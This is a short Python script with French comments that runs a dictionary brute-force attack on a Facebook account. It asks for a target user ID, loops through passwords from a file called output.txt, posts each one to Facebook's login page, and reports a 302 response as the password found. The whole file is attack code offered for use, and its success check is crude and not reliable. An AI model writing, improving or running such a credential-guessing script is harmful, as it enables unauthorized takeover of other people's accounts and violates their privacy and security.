import requests
# Demander à l'utilisateur pour son ID d'utilisateur Facebook et l'URL de connexion
user_id = input("Entrer votre ID d'utilisateur Facebook: ")
login_url = "https://www.facebook.com/login.php"

# Ouvrir le fichier contenant les mots de passe
with open("output.txt", "r") as f:
    # Boucle à travers chaque ligne du fichier
    while True:
        password = f.readline().strip()
        if password == "":
            break
        # Définir les données de connexion
        login_data = {"email": user_id, "pass": password}

        # Envoyer une demande de connexion avec les données de connexion
        session = requests.session()
        response = session.post(login_url, data=login_data, allow_redirects=False)

        # Si la réponse est un code de statut 302 (Found) et la location de la réponse est la page d'accueil de Facebook
        if response.status_code == 302:
            print("Mot de passe trouvé: ", password)
            break
        else:
            print("Mot de passe incorrect: ", password)
            print(response.status_code )
